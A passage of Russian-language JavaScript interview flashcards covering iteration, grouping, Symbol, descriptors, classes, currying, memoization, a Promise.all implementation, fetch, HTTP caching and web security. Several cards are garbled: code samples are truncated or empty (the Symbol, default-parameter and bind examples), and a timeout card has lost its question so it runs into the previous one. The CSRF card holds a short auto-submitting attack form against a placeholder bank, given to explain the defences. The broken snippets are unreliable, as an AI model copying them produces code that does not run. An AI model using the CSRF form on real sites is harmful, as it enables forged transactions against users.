- **`for...of`** перебирает **значения** итерируемого объекта: массива, строки, `Map`, `Set`. Обычный объект `{}` через `for...of` перебрать нельзя — будет `TypeError: obj is not iterable`.

```js
const arr = ["a", "b"];
arr.extra = "!";

for (const i in arr) console.log(i); // "0", "1", "extra" — ключи, ещё и строками
for (const v of arr) console.log(v); // "a", "b" — только элементы
```

Почему `for...in` опасен для массивов:

- индексы приходят строками: `i + 1` даст `"01"`, а не `1`;
- захватывает лишние свойства — свои и добавленные в прототип какой-нибудь библиотекой;
- порядок обхода для массивов не гарантировался исторически.

Как правильно:

```js
for (const item of list) {}                        // элементы массива
for (const [i, item] of list.entries()) {}         // с индексом
for (const [key, value] of Object.entries(obj)) {} // объект
```

`Object.keys`, `values`, `entries` возвращают только **собственные** свойства объекта, без прототипа, — поэтому для объектов их сочетают с `for...of`.

@@@ js-29 | массивы, группировка
Как сгруппировать массив объектов по полю?
???
Задача: из списка людей получить объект «отдел → люди этого отдела».

Современный способ (ES2024) — `Object.groupBy`. Он принимает массив и функцию, которая для каждого элемента возвращает ключ группы:

```js

  { name: "Ann", dept: "dev" },
  { name: "Bob", dept: "qa" },
  { name: "Kim", dept: "dev" },
];

Object.groupBy(people, (p) => p.dept);
// { dev: [Ann, Kim], qa: [Bob] } — объект без прототипа

Map.groupBy(people, (p) => p.dept); // то же, но в Map
```

Результат `Object.groupBy` создан без прототипа (`Object.create(null)`), поэтому у него нет методов вроде `hasOwnProperty`. `Map.groupBy` удобен, когда ключ группы — объект или нужен порядок.

Классика для собеса — через `reduce`, где аккумулятор постепенно наполняется:

```js
const byDept = people.reduce((acc, p) => {
  (acc[p.dept] ??= []).push(p.name); // создать массив при первом появлении отдела
  return acc;
}, {});
// { dev: ["Ann", "Kim"], qa: ["Bob"] }
```

`acc[p.dept] ??= []` — если для отдела ещё нет массива, создать пустой, затем `push`. Важно не забыть `return acc`, иначе на следующем шаге аккумулятор станет `undefined`.

Сложность обоих решений — O(n): один проход по массиву.

@@@ js-30 | symbol, типы
Что такое `Symbol` и где он применяется?
???
`Symbol()` — примитив, гарантированно уникальный: `Symbol("id") !== Symbol("id")`. Описание в скобках нужно только для отладки.

Зачем нужен:

```js
  to: 3,

  },
};

```

`Symbol.for("app.key")` берёт символ из глобального реестра: один и тот же для всех вызовов с этим ключом.

Пример из жизни: библиотека добавляет к вашему объекту служебную пометку `obj[MARK] = true`. Если бы ключ был строкой `"mark"`, он мог бы затереть ваше поле с тем же именем. С символом это невозможно. Символы не полностью скрыты — их видно через `Object.getOwnPropertySymbols`, — но случайно на них не наткнуться.

@@@ js-31 | объекты, дескрипторы
Что такое дескрипторы свойств, геттеры и сеттеры?
???
У каждого свойства объекта, помимо значения, есть флаги: `writable` (можно менять), `enumerable` (видно в `Object.keys` и `for...in`), `configurable` (можно удалить и перенастроить).

```js
const user = {};
Object.defineProperty(user, "id", { value: 1, writable: false, enumerable: true });
user.id = 2;   // молча игнорируется, в строгом режиме — TypeError
```

У `defineProperty` все флаги по умолчанию `false`, у обычного присваивания — `true`.

Геттер и сеттер — вычисляемое свойство, которое выглядит как обычное поле:

```js
const temp = {
  celsius: 20,
  get fahrenheit() { return this.celsius * 1.8 + 32; },
  set fahrenheit(f) { this.celsius = (f - 32) / 1.8; },
};
temp.fahrenheit;       // 68 — функция вызвалась при чтении
temp.fahrenheit = 212; // temp.celsius === 100
```

Геттер удобен для значений, которые выводятся из других полей: хранить их отдельно — риск рассинхронизации. Сеттер — для проверки значения при записи.

Посмотреть флаги: `Object.getOwnPropertyDescriptor(obj, "key")`. Так, например, устроено `length` у массива: оно `writable`, но не `enumerable`, поэтому не попадает в `for...in`.

@@@ js-32 | объекты, иммутабельность
Чем отличаются `Object.freeze`, `Object.seal` и `Object.preventExtensions`?
???
Это три ступени защиты объекта, от мягкой к строгой:

- `preventExtensions` — нельзя **добавлять** новые свойства; удалять и менять можно;
- `seal` — нельзя добавлять и **удалять**; менять значения можно;
- `freeze` — нельзя ничего: ни добавлять, ни удалять, ни **менять**.

```js
const user = Object.seal({ name: "Аня" });
user.name = "Боб"; // ок
delete user.name;  // не сработает
user.age = 20;     // не сработает
```

Важные детали:

- Все три **поверхностные**: `Object.freeze(config)` не замораживает `config.db` — вложенный объект можно менять. Для глубокой заморозки нужен рекурсивный обход.
- Нарушение в обычном режиме молча игнорируется, а в строгом (модули, классы) бросает `TypeError`.
- `const` и `freeze` — разные вещи: `const` запрещает переприсвоить переменную, `freeze` — менять сам объект.

В TypeScript для того же на уровне типов есть `Readonly<T>` и `as const`, но они работают только при компиляции.

@@@ js-33 | классы, прототипы
Что такое классы в JS под капотом?
???
Синтаксис поверх прототипов: методы класса попадают в `Class.prototype`, а экземпляр ссылается на него через `[[Prototype]]`. Сам класс — это функция-конструктор.

```js
class Animal {
  #secret = 42;           // приватное поле, недоступно снаружи
  static count = 0;       // поле самого класса, а не экземпляра
  constructor(name) { this.name = name; }
  speak() { return `${this.name} издаёт звук`; }
}

class Dog extends Animal {
  speak() { return `${super.speak()}: гав`; }
}

typeof Animal;                                       // "function"
Object.getPrototypeOf(Dog.prototype) === Animal.prototype; // true
```

Что откуда берётся у `new Dog("Рекс")`: поле `name` — собственное свойство экземпляра (создано в конструкторе), метод `speak` — из `Dog.prototype`, а `super.speak()` берёт метод из `Animal.prototype`. Поля, объявленные в теле класса (`#secret`), создаются в каждом экземпляре отдельно.

Отличия от функций-конструкторов: класс нельзя вызвать без `new`, тело класса всегда в строгом режиме, методы не перечисляются в `for...in`, а в наследнике нужно вызвать `super()` до обращения к `this`.

Приватные поля `#` — настоящая приватность на уровне языка: обращение `dog.#secret` снаружи — синтаксическая ошибка, в отличие от соглашения `_secret`.

@@@ js-34 | функции, this
Чем стрелочная функция отличается от обычной?
???
- **Нет своего `this`** — берётся из окружения, где стрелка создана. `call`, `apply` и `bind` его не меняют.
- **Нет `arguments`** — используй rest-параметры `(...args)`.
- **Нельзя вызвать с `new`** и нет `prototype`.
- Не может быть генератором.

```js
class Timer {
  seconds = 0;
  start() {
    setInterval(() => this.seconds++, 1000); // this — экземпляр
    // с function () { this.seconds++ } this был бы потерян
  }
}
```

Почему так: `setInterval` вызывает колбэк просто как `fn()`, без объекта перед точкой. Обычная функция получила бы `this === undefined`. Стрелка же не имеет своего `this` и «видит» `this` метода `start`, то есть экземпляр.

Когда стрелка **не** подходит: методы объекта, которым нужен `this` объекта (`{ getName: () => this.name }` вернёт не то), и обработчики, где нужен `this` как элемент.

Короткая форма возвращает значение без `return`: `(x) => x * 2`. Чтобы вернуть объект, его оборачивают в скобки: `() => ({ id: 1 })` — иначе фигурные скобки примут за тело функции.

@@@ js-35 | деструктуризация, ловушка
Когда срабатывают значения по умолчанию в деструктуризации и параметрах?
???

```js
greet(null);      // null
```

Почему так: `undefined` означает «значение не передали», а `null` — «передали, и это явно пусто». Отсутствующее поле тоже даёт `undefined`, поэтому `const { limit = 10 } = {}` сработает.

Без `= {}` в последней строке вызов `f()` упадёт: деструктуризировать `undefined` нельзя.

@@@ js-36 | функции, каррирование
Что такое каррирование? Напиши `curry`.
???
Превращение функции от нескольких аргументов в цепочку функций, каждая из которых принимает часть аргументов: `sum(1, 2, 3)` → `sum(1)(2)(3)`.

```js
function curry(fn) {
  return function curried(...args) {
    if (args.length >= fn.length) return fn.apply(this, args);
    return (...next) => curried.apply(this, [...args, ...next]);
  };
}

const sum = curry((a, b, c) => a + b + c);
sum(1)(2)(3); // 6
sum(1, 2)(3); // 6
```

Как это работает: `curried` копит аргументы. Если их уже столько, сколько ждёт исходная функция (`fn.length`), — вызывает её. Если меньше — возвращает новую функцию, которая добавит следующие аргументы к накопленным и снова проверит.

`fn.length` — число объявленных параметров (без rest и параметров со значениями по умолчанию).

Зачем на практике: частичное применение и заготовки функций — `const logError = log("error")`, `const byId = prop("id")`. В React похожий приём — обработчик, который возвращает обработчик: `onClick={select(id)}`.

@@@ js-37 | функции, кэш
Что такое мемоизация? Напиши `memoize`.
???
Кэширование результата функции по аргументам: повторный вызов с теми же аргументами возвращает готовый ответ, не пересчитывая. Подходит только для **чистых** функций — иначе из кэша вернётся устаревший результат.

```js
function memoize(fn) {
  const cache = new Map();
  return (...args) => {
    const key = JSON.stringify(args);
    if (!cache.has(key)) cache.set(key, fn(...args));
    return cache.get(key);
  };
}

const slowSquare = (n) => n * n;
const fastSquare = memoize(slowSquare);
fastSquare(9); // считает
fastSquare(9); // берёт из кэша
```

`cache` живёт в замыкании: он общий для всех вызовов `fastSquare`, но недоступен снаружи.

Подводные камни, которые спрашивают на собесе:

- `JSON.stringify` плохо работает с функциями, `Map`, циклическими ссылками; для одного аргумента-объекта лучше `WeakMap` с объектом как ключом.
- Кэш растёт бесконечно — нужен лимит (LRU) или сброс.
- Асинхронную функцию тоже можно мемоизировать — кэшируется промис, и параллельные вызовы получат один запрос.

В React то же самое делают `useMemo` и `memo`, но они помнят только **последний** результат, а не все.

@@@ js-38 | промисы, задача
Напиши свой `Promise.all`.
???
```js
function promiseAll(items) {
  return new Promise((resolve, reject) => {
    const list = Array.from(items);
    const results = new Array(list.length);
    let left = list.length;
    if (left === 0) return resolve(results);

    list.forEach((item, i) => {
      Promise.resolve(item).then((value) => {
        results[i] = value;
        if (--left === 0) resolve(results);
      }, reject);
    });
  });
}
```

Как работает: все промисы запускаются одновременно, `left` считает, сколько ещё не завершилось. Каждый успех кладёт значение на свою позицию и уменьшает счётчик. Когда счётчик дошёл до нуля — все готовы, отдаём массив.

На что смотрят:

- результаты кладутся **по индексу**, а не в порядке завершения — `push` здесь был бы ошибкой;
- `Promise.resolve(item)` позволяет передавать и обычные значения;
- первая ошибка сразу отклоняет общий промис (остальные запросы при этом не отменяются);
- повторные `reject` и `resolve` игнорируются — промис меняет состояние только один раз;
- пустой массив — сразу `[]`.

@@@ js-39 | функции, полифил
Напиши полифил `Function.prototype.bind`.
???
`bind` возвращает новую функцию с привязанным `this` и частью аргументов:

```js

  const fn = this;
  return function (...args) {
    return fn.apply(context, [...bound, ...args]);
  };
};

const user = { name: "Аня" };
function hello(greeting, mark) { return `${greeting}, ${this.name}${mark}`; }

const hi = hello.myBind(user, "Привет");
hi("!"); // "Привет, Аня!"
```

Разбор: внутри `myBind` `this` — это сама функция `hello`, потому что вызов выглядит как `hello.myBind(...)`. Сохраняем её в `fn`. Возвращаемая функция объединяет заранее переданные аргументы (`bound`) с новыми (`args`) и вызывает `fn` через `apply` с нужным контекстом.

`myBind` объявлен через `function`, а не стрелкой — иначе потерялся бы `this`, указывающий на исходную функцию.

Чем настоящий `bind` сложнее: если связанную функцию вызвать с `new`, привязанный `this` игнорируется и создаётся новый объект. Повторный `bind` уже связанной функции `this` не меняет.

```js

};
```

`Promise.race` возьмёт то, что завершится первым: результат операции или ошибку таймера. `finally` убирает таймер, чтобы он не висел, если операция успела раньше.

Минус: исходная операция продолжает выполняться, мы просто перестаём её ждать.

Для `fetch` есть способ лучше — он действительно отменяет запрос:

```js
const res = await fetch(url, { signal: AbortSignal.timeout(5000) });
// при таймауте — ошибка с name === "TimeoutError"
```

Совместить ручную отмену и таймаут: `AbortSignal.any([controller.signal, AbortSignal.timeout(5000)])`.

@@@ js-41 | fetch, ловушка
Почему `fetch` не бросает ошибку на 404 или 500?
???
`fetch` отклоняет промис только при **сетевой** ошибке: нет сети, CORS, DNS, отмена. Ответ 404 или 500 — это успешно полученный HTTP-ответ, промис выполняется, а `res.ok` равен `false`.

Логика такая: `fetch` отвечает за доставку, а не за смысл ответа. Сервер ответил — значит, запрос выполнен, а что ответ «плохой», решает уже ваш код.

```js
async function getJson(url) {
  const res = await fetch(url);
  if (!res.ok) throw new Error(`HTTP ${res.status}`);
  return res.json();
}
```

`res.ok` — `true` для статусов 200–299.

Ещё отличия от axios:

- тело нужно прочитать вручную: `res.json()`, `res.text()` — и только один раз;
- нет встроенного таймаута (используют `AbortSignal.timeout`);
- для отправки JSON нужно самому сделать `JSON.stringify` и указать заголовок `Content-Type: application/json`;
- cookies на другой домен уходят только с `credentials: "include"`.

@@@ js-42 | dom, события
Чем отличаются `preventDefault`, `stopPropagation` и фаза перехвата?
???
- `preventDefault()` отменяет **действие браузера по умолчанию**: переход по ссылке, отправку формы, прокрутку. Событие продолжает всплывать.

Пример: в форме с `onSubmit` вызывают `e.preventDefault()`, чтобы страница не перезагрузилась, а данные отправились через `fetch`.

```js
document.addEventListener("click", log, { capture: true }); // сработает первым
```

Полезные опции: `{ once: true }` — обработчик удалится после первого вызова; `{ passive: true }` — обещание не вызывать `preventDefault`, что ускоряет прокрутку на `touchmove` и `wheel`.

Ловушка: `stopPropagation` ломает делегирование и аналитику, которые слушают события выше, — используй его осознанно.

@@@ js-43 | браузер, загрузка
Чем отличаются `<script>`, `async` и `defer`?
???
- **Обычный `<script>`** блокирует разбор HTML: браузер останавливается, скачивает и выполняет скрипт, потом продолжает.
- **`async`** скачивается параллельно и выполняется **сразу, как загрузится**, прерывая разбор. Порядок между скриптами не гарантирован. Подходит для независимых скриптов: аналитика, реклама.

```html
<script src="analytics.js" async></script>
<script src="vendor.js" defer></script>
<script src="app.js" defer></script>
```

Почему обычный скрипт блокирует: скрипт может изменить документ через `document.write`, поэтому браузер не рискует разбирать HTML дальше, пока скрипт не выполнится. Пока он качается, пользователь видит белый экран.

`<script type="module">` по умолчанию ведёт себя как `defer`. Старый совет «ставь скрипты в конец `<body>`» решал ту же проблему до появления `defer`.

@@@ js-44 | http, кэширование
Как работает HTTP-кэширование: `Cache-Control`, `ETag`?
???
Сервер говорит браузеру, сколько можно хранить ответ, через заголовок `Cache-Control`:

- `max-age=31536000, immutable` — хранить год и не перепроверять. Так отдают статику с хешем в имени (`app.3f9a.js`): новая версия — новое имя файла.
- `no-cache` — хранить можно, но перед использованием **обязательно** спросить сервер. Так отдают HTML.
- `no-store` — не хранить вообще (личные данные).
- `private` / `public` — можно ли кэшировать на CDN и прокси.

Перепроверка (revalidation): сервер присылает `ETag: "abc"` (отпечаток содержимого). Браузер в следующий раз отправит `If-None-Match: "abc"`, и если ничего не изменилось, сервер ответит `304 Not Modified` без тела — экономия трафика.

`stale-while-revalidate=60` разрешает показать устаревший ответ и обновить его в фоне.

Почему схема «HTML — `no-cache`, статика с хешем — на год» популярна: HTML всегда свежий и ссылается на актуальные имена файлов. Сами файлы никогда не меняются под тем же именем, поэтому их можно кэшировать навсегда, а при новом деплое браузер просто скачает новые имена.

@@@ js-45 | безопасность, авторизация
Где хранить токен авторизации: `localStorage` или cookie?
???
**`localStorage`** доступен любому JS на странице. Если на сайте найдётся XSS, скрипт злоумышленника прочитает токен и отправит себе — и сможет пользоваться аккаунтом со своего компьютера, пока токен действует.

**Cookie с флагами** безопаснее:

```
Set-Cookie: session=…; HttpOnly; Secure; SameSite=Lax; Path=/
```

- `HttpOnly` — JS не может прочитать cookie, украсть её через XSS нельзя;
- `Secure` — только по HTTPS;
- `SameSite=Lax` — не отправляется с запросами с чужих сайтов (кроме переходов по ссылке), это базовая защита от CSRF.

Частая схема с JWT: короткоживущий access-токен в памяти приложения и долгоживущий refresh-токен в `HttpOnly` cookie. Важно: XSS всё равно опасен — скрипт может слать запросы от имени пользователя, просто не унесёт токен с собой.

Минус cookie: она автоматически уходит с каждым запросом на свой домен, поэтому нужна защита от CSRF. У токена в заголовке `Authorization` этой проблемы нет, но его приходится хранить там, где JS его видит.

@@@ js-46 | безопасность, csrf
Что такое CSRF и как от него защищаются?
???
Cross-Site Request Forgery — чужой сайт заставляет браузер пользователя отправить запрос на ваш сайт. Браузер автоматически приложит cookie, и сервер решит, что запрос сделал сам пользователь.

```html
<!-- на сайте злоумышленника -->
<form action="https://bank.example/transfer" method="POST">
  <input name="to" value="hacker" />
</form>
<script>document.forms[0].submit()</script>
```

Пользователь залогинен в банке, заходит на чужую страницу — и форма незаметно отправляется в банк с его cookie. Злоумышленник ответ не увидит (мешает same-origin policy), но ему и не нужно: перевод уже выполнен.

Защита:

- `SameSite=Lax` или `Strict` у сессионной cookie — главная защита в современных браузерах;
- CSRF-токен: случайное значение в форме, которое сервер сверяет с сессией;
- проверка заголовков `Origin` / `Referer`;
- не менять данные GET-запросами.

Если токен передаётся в заголовке `Authorization`, а не в cookie, классический CSRF не работает — браузер не подставляет этот заголовок сам. Server Actions в Next.js сверяют `Origin` с `Host` автоматически.

@@@ js-47 | безопасность, csp
Что такое Content Security Policy?
???
Заголовок ответа, который говорит браузеру, откуда странице **разрешено** загружать скрипты, стили, картинки и куда отправлять запросы. Даже если злоумышленник внедрит `<script>`, браузер его не выполнит.

```
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-r4nd0m';
  img-src 'self' https://cdn.example.com;
  connect-src 'self' https://api.example.com;
  object-src 'none';
  frame-ancestors 'none'
```

- `'self'` — только свой домен;
- `nonce` — разрешает конкретные inline-скрипты с этим одноразовым значением, без небезопасного `'unsafe-inline'`;
- `frame-ancestors 'none'` — запрет встраивать сайт в iframe (защита от кликджекинга).

Как это помогает при XSS: внедрённый `<script>` без правильного `nonce` браузер выполнять откажется, а `connect-src` не даст отправить украденные данные на чужой сервер.

Внедряют постепенно: сначала `Content-Security-Policy-Report-Only` — нарушения только логируются, ничего не ломается. CSP — второй рубеж: экранировать данные всё равно нужно.

@@@ js-48 | сеть, realtime
Как получать обновления с сервера в реальном времени: polling, SSE, WebSocket?
???
- **Polling** — запрос раз в N секунд. Просто и работает везде, но много пустых запросов и задержка до N секунд.
- **Long polling** — сервер держит запрос открытым, пока не появятся данные. Меньше пустых ответов, но сложнее на сервере.
- **SSE (Server-Sent Events)** — одно HTTP-соединение, по которому сервер шлёт события **в одну сторону**. Автопереподключение из коробки. Хорошо для уведомлений, ленты, стриминга ответа ИИ.
- **WebSocket** — постоянное **двустороннее** соединение. Для чатов, совместного редактирования, игр. Переподключение и heartbeat придётся писать самому.

```js
const events = new EventSource("/api/notifications");
events.onmessage = (e) => show(JSON.parse(e.data));
```

Правило выбора: если клиенту нужно только получать — SSE; если обе стороны часто шлют сообщения — WebSocket.

SSE работает поверх обычного HTTP, поэтому проходит через прокси и балансировщики без особой настройки. Минус — только текст и только от сервера к клиенту; отправлять данные на сервер клиент будет обычными `fetch`-запросами.

@@@ js-49 | браузер, производительность
Что такое Web Workers и когда они нужны?
???
JavaScript в браузере выполняется в одном главном потоке — там же, где отрисовка и обработка кликов. Тяжёлое вычисление на 2 секунды заморозит интерфейс на 2 секунды.

Web Worker — отдельный поток для вычислений. У него нет доступа к DOM, общение — сообщениями:

```js
// main.js
const worker = new Worker(new URL("./worker.js", import.meta.url), { type: "module" });
worker.postMessage(bigArray);
worker.onmessage = (e) => render(e.data);

// worker.js
self.onmessage = (e) => self.postMessage(heavySort(e.data));
```

Когда нужны: парсинг больших файлов (CSV, Excel), обработка изображений, шифрование, поиск по большому массиву.

Данные при передаче **копируются** (structured clone). Большие бинарные буферы можно передать без копирования — как transferable-объекты.

Когда не нужны: для запросов к серверу — `fetch` и так не блокирует поток. Воркер помогает только с **вычислениями** на процессоре. Если операция занимает меньше ~50 мс, накладные расходы на передачу данных могут съесть всю выгоду.

@@@ js-50 | dom, observer
Что такое `IntersectionObserver` и где он нужен?
???
API, которое сообщает, когда элемент появляется в области видимости или уходит из неё. Работает асинхронно и не нагружает главный поток, в отличие от обработчика `scroll` с `getBoundingClientRect`.

```js
const observer = new IntersectionObserver(
  (entries) => {
    entries.forEach((entry) => {
      if (entry.isIntersecting) loadMore();
    });
  },
  { rootMargin: "200px" }, // сработать за 200px до появления
);
observer.observe(sentinel);
// при размонтировании: observer.disconnect()
```

Где применяют: бесконечная лента (следим за элементом в конце списка), ленивая загрузка картинок и тяжёлых блоков, анимации при прокрутке, учёт просмотров рекламы.

Опция `threshold` задаёт, какая доля элемента должна стать видимой: `0` — хоть пиксель, `1` — целиком, `[0, 0.5, 1]` — сообщать на каждом пороге.

Для картинок обычно хватает встроенного `<img loading="lazy">`. Родственники: `ResizeObserver` (изменение размеров элемента) и `MutationObserver` (изменения DOM).

@@@ js-51 | intl, форматирование
Как правильно форматировать числа, валюту и даты?
???
Встроенным API `Intl` — он знает правила локали, и не нужно склеивать строки вручную:

```js
new Intl.NumberFormat("ru-RU", { style: "currency", currency: "RUB" }).format(1234.5);
// "1 234,50 ₽"

new Intl.DateTimeFormat("ru-RU", { day: "numeric", month: "long" }).format(new Date());
// "31 октября"

new Intl.RelativeTimeFormat("ru", { numeric: "auto" }).format(-1, "day");
// "вчера"

new Intl.PluralRules("ru-RU").select(5); // "many" — для «5 карточек»
```

Короткие варианты: `num.toLocaleString("ru-RU")` и `date.toLocaleDateString("ru-RU")`.

Совет: создание форматтера — дорогая операция. В списке на тысячи строк создай его один раз снаружи и вызывай `.format()`. И помни, что результат зависит от локали: на сервере и клиенте она может отличаться, что даст hydration mismatch.

`PluralRules` решает русскую проблему склонений: возвращает категорию `"one"` (1, 21), `"few"` (2–4, 22) или `"many"` (5–20, 25), а ты по ней выбираешь «карточка», «карточки» или «карточек».
